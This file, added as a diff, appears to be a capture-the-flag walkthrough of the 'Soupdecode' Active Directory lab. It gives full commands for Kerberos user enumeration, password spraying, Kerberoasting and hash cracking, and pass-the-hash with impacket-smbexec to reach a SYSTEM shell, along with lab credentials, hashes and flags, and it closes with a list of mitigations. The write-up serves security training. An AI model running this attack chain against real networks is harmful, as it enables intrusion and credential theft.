@@ -1,0 +1,156 @@
+SOUPDECODE CTF - COMPLETE WALKTHROUGH
+=======================================
+Target: 10.48.157.189 (DC01.SOUPEDECODE.LOCAL)
+Date: February 15, 2026
+
+PHASE 1: RECONNAISSANCE
+-----------------------
+
+Step 1: Nmap Scan
+Command: nmap -sC -sV 10.48.157.189
+Why we do it: Initial port scanning identifies all open ports and services running on the target. This gives us a blueprint of the attack surface.
+
+Key Findings:
+- Port 389, 3268: LDAP services reveal domain name "SOUPEDECODE.LOCAL"
+- Port 445: SMB indicates file sharing capabilities
+- Port 88: Kerberos confirms this is a Domain Controller
+- Port 3389: RDP shows remote desktop is available
+- Port 53: DNS server running
+
+Why this matters: Identifying a Domain Controller tells us we're dealing with Active Directory, which has specific attack vectors like Kerberos attacks, LDAP enumeration, and SMB exploitation.
+
+PHASE 2: USER ENUMERATION
+-------------------------
+
+Step 2: RID Brute Force Attempt
+Command: crackmapexec smb 10.48.157.189 -u guest -p '' --rid-brute
+Why we do it: RID cycling attempts to enumerate users via null/anonymous sessions. This is often the first step in AD enumeration.
+
+Result: Limited success, but confirms domain structure.
+
+Step 3: Kerbrute User Enumeration
+Command: ./kerbrute_linux_amd64 userenum /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.48.157.189 --domain SOUPEDECODE.LOCAL
+Why we do it: Kerberos pre-authentication failures reveal valid usernames without triggering failed login alerts. This is stealthier than SMB enumeration.
+
+The Logic: When you request a Kerberos ticket for a user that doesn't exist, the KDC returns "KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN". For valid users, you get "PREAUTH_REQUIRED". This difference allows us to build a user list.
+
+PHASE 3: PASSWORD SPRAYING
+--------------------------
+
+Step 4: Password Spray Attack
+Command: ./kerbrute_linux_amd64 passwordspray --user-as-pass /home/rahu/Downloads/ctf/soupdecode/users1.txt --dc 10.48.157.189 --domain SOUPEDECODE.LOCAL
+Why we do it: Users often set passwords matching their username. Password spraying attempts one common password across many accounts to avoid lockouts.
+
+Result: Found ybob317:ybob317
+Why this works: Many organizations have weak password policies, and users frequently choose convenience over security.
+
+PHASE 4: INITIAL ACCESS & USER FLAG
+-----------------------------------
+
+Step 5: Check SMB Shares
+Command: nxc smb soupedecode.local -u ybob317 -p ybob317 --shares
+Why we do it: Once we have credentials, we check what network resources the user can access. SMB shares often contain sensitive data.
+
+Step 6: Access SMB and Retrieve User Flag
+Command: impacket-smbclient 'soupedecode.local/ybob317:ybob317'@soupedecode.local
+Why we do it: Direct SMB access allows us to browse files as the authenticated user.
+
+User Flag Found: 28189316c25dd3c0ad56d44d000d62a8 (in ybob317's desktop)
+Why here: User flags are typically placed in accessible locations like desktop or documents folder.
+
+PHASE 5: PRIVILEGE ESCALATION - KERBEROASTING
+---------------------------------------------
+
+Step 7: Request Service Tickets
+Command: impacket-GetUserSPNs 'soupedecode.local/ybob317:ybob317' -request -usersfile users1.txt -dc-ip soupedecode.local
+Why we do it: Kerberoasting targets service accounts with SPNs. When we request a service ticket for these accounts, the ticket is encrypted with the service account's NTLM hash. We can crack this offline.
+
+The Technical Bit:
+- Service Principal Names (SPNs) uniquely identify service instances
+- Any domain user can request a TGS for any service
+- The TGS is encrypted with the service account's NTLM hash
+- We capture this hash and crack it offline
+
+Result: Got TGS hash for file_svc account
+
+Step 8: Crack the Hash
+Command: john code --wordlist=/usr/share/wordlists/rockyou.txt
+Why we do it: The TGS hash is encrypted with RC4-HMAC using the service account's password. John the Ripper attempts to find the password through brute-force/dictionary attacks.
+
+Cracked Password: Password123!!
+Why this password: RockYou.txt is a comprehensive wordlist of leaked passwords. "Password123!!" follows common patterns (common word + numbers + symbols).
+
+PHASE 6: LATERAL MOVEMENT
+-------------------------
+
+Step 9: Access Backup Share with file_svc Credentials
+Command: smbclient -U soupedecode.local/file_svc //10.48.170.238/backup
+Why we do it: Service accounts often have broader access than regular user accounts. The backup share might contain sensitive system information.
+
+Step 10: Extract NTLM Hashes from backup_extract.txt
+Why this works: Backup files often contain sensitive authentication data. The file contained NTLM hashes for multiple computer accounts, likely from a domain backup.
+
+PHASE 7: PASS-THE-HASH & ROOT FLAG
+----------------------------------
+
+Step 11: Pass-the-Hash Attack
+Command: impacket-smbexec 'FileServer$'@soupedecode.local -hashes ':e41da7e79a4c76dbd9cf79d1cb325559'
+Why we do it: Pass-the-Hash allows authentication using the NTLM hash without needing the plaintext password. Computer account hashes are particularly valuable as they often have SYSTEM-level privileges.
+
+The Technical Explanation:
+- NTLM authentication can use the hash directly
+- The hash :e41da7e79a4c76dbd9cf79d1cb325559 is the NT hash for FileServer$
+- smbexec creates a semi-interactive shell using Windows Management Instrumentation (WMI) through SMB
+- Computer accounts (with $ suffix) typically have high privileges on their host
+
+Result: SYSTEM-level access achieved
+
+Step 12: Retrieve Root Flag
+Root Flag Found: 27cb2be302c388d63d27c86bfdd5f56a
+Why here: Root/Administrator flags are typically in privileged locations like Administrator's desktop or system root.
+
+COMPLETE ATTACK PATH SUMMARY
+============================
+
+1. Reconnaissance → Identified Domain Controller
+2. User Enumeration → Built user list via Kerberos
+3. Password Spraying → Found weak credentials (ybob317)
+4. Initial Access → Retrieved user flag from SMB
+5. Kerberoasting → Got and cracked file_svc TGS
+6. Lateral Movement → Accessed backup share with file_svc
+7. Hash Extraction → Found computer account hashes
+8. Pass-the-Hash → Gained SYSTEM access as FileServer$
+9. Root Flag → Retrieved from privileged location
+
+KEY VULNERABILITIES EXPLOITED
+=============================
+
+1. Weak Password Policy: Users can have passwords matching usernames
+2. Kerberoastable Service Accounts: file_svc had SPN set with crackable password
+3. Insecure Backups: NTLM hashes stored in accessible backup share
+4. Pass-the-Hash Vulnerability: NTLM authentication allows hash-based login
+5. Over-privileged Computer Accounts: FileServer$ had SYSTEM-level access
+
+MITIGATIONS (How to Prevent This)
+=================================
+
+1. Enforce strong password policies and complexity requirements
+2. Use Group Managed Service Accounts (gMSA) for services
+3. Implement Credential Guard to prevent Pass-the-Hash
+4. Secure backup files with encryption and strict access controls
+5. Regular security audits and penetration testing
+6. Implement account lockout policies to prevent password spraying
+7. Disable RC4 encryption for Kerberos tickets
+8. Monitor for unusual Kerberos ticket requests
+
+TOOLS USED
+==========
+
+- Nmap: Port scanning and service enumeration
+- Kerbrute: Kerberos user enumeration and password spraying
+- CrackMapExec (nxc): SMB enumeration and authentication testing
+- Impacket suite: SMB client, GetUserSPNs, smbexec
+- John the Ripper: Password hash cracking
+- SMBClient: File share access
+
+This CTF demonstrates a realistic Active Directory attack chain, from initial reconnaissance through to domain administrator compromise, highlighting the importance of defense-in-depth security strategies.
